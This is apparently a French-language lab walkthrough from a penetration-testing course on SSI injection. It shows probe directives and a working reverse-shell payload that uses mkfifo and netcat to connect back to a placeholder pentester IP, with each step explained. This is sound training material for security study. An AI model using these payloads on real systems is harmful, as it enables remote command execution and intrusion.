Exemple d'exploitation d'injection SSI
======================================

* * * * *

Pratiquons l'injection SSI sur une application Web accessible sur Internet (la cible peut être générée à la fin de cette section). Accédez à la fin de cette section et cliquez sur `Click here to spawn the target system`, puis utilisez la Pwnbox fournie ou une VM locale pour suivre. En naviguant jusqu'à la cible générée, nous rencontrons ci-dessous.

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.png)

Concentrons-nous sur l'identification d'une vulnérabilité d'injection SSI en soumettant certaines des directives SSI mentionnées dans la section précédente.

Code : html

```
1\. <!--#echo var="DATE_LOCAL" -->
2\. <!--#printenv -->

```

#### Date

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_1.5.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_2.png)

#### Toutes les variables

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_3.png)

![image](https://academy.hackthebox.com/storage/modules/145/img/SSI_4.png)

Comme nous pouvons le voir, l'application est en effet vulnérable à SSI Injection ! Maintenant, passez à l'exercice à la fin de cette section et tirez parti de toutes les directives SSI répertoriées dans la section précédente qui peuvent entraîner l'exécution de commandes sur le système sous-jacent pour le terminer.

Remarque : Comme nous l'avons vu, l'exécution de commandes du système d'exploitation via SSI sur l'application cible est possible, mais qui n'aime pas les shells ? Gardez à l'esprit la charge utile du shell inverse suivante qui fonctionnera même contre OpenBSD-netcat qui n'inclut pas la fonctionnalité d'exécution par défaut. Notez également que vous ne pourrez pas obtenir de shell inversé dans l'exercice de cette section, en raison de restrictions réseau !

#### Coque inversée

Code : html

```
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

```

-   `mkfifo /tmp/foo`: Créer un fichier spécial FIFO dans`/tmp/foo`
-   `nc <IP> <PORT> 0</tmp/foo`: Connectez-vous à la machine pentester et redirigez le descripteur d'entrée standard
-   `| bin/bash 1>/tmp/foo`: Exécute `/bin/bash`la redirection du descripteur de sortie standard vers`/tmp/foo`
-   `rm /tmp/foo`: Nettoyer le fichier FIFO
